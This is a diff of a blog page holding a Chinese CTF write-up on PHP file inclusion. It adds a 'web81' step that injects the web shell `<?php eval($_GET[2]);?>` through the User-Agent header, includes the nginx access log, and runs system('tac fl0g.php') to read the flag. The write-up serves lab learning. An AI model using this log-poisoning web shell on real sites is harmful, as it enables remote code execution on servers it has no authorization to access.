@@ -27,7 +27,7 @@
 <meta property="og:description" content="文件包含函数(php):include($file):包含文件，出错时仅报警告（E_WARNING），程序继续执行。 require($file):包含文件，出错时报致命错误（E_COMPILE_ERROR），程序终止。 include_once($file):与 include 类似，但会先检查文件是否已被包含，避免重复包含。 require_once($file):与 require 类似，但">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-06-08T13:00:11.000Z">
-<meta property="article:modified_time" content="2025-06-11T18:19:45.842Z">
+<meta property="article:modified_time" content="2025-06-12T08:56:39.990Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -226,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          1.7k 字
         
       </span>
     
@@ -237,7 +237,7 @@
         
         
         
-          14 分钟
+          15 分钟
         
       </span>
     
@@ -387,6 +387,10 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>也可以直接大小写绕过</p>
+<h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p>可以不用伪协议，开始写马</p>
+<p>在响应头的server中看见服务器为nginx，包含 nginx 访问日志记录：<strong>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong></p>
+<p>Apache 默认的 combined 日志格式会 原样记录 User-Agent 字符串，不会进行 URL 解码或过滤特殊字符。所以我们改UA。直接添加<?php eval($_GET[2]);?></p>
+<p>get改成**?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&amp;2&#x3D;system(‘tac fl0g.php’);**抓个get包，复制第一行替换原日志第一行即可获得flag</p>
 
                 
               </div>
